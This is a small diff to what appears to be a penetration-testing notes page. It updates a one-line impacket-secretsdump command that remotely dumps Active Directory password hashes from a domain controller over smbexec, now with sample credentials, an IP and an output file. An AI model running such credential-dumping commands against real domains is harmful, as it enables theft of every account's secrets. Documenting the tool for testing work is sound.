@@ -37,7 +37,7 @@ Or you can do it with a 1 liner remotely. but becareful it doesnt crash the conn
 
 {% code overflow="wrap" %}
 ```
-impacket-secretsdump -just-dc -user-status -pwd-last-set -history -exec-method smbexec DOMAIN/USER:PASS@IP
+impacket-secretsdump -just-dc -user-status -exec-method smbexec 'domaincorp/user123:Password1@10.144.2.11' -outputfile myhashes
 ```
 {% endcode %}
 
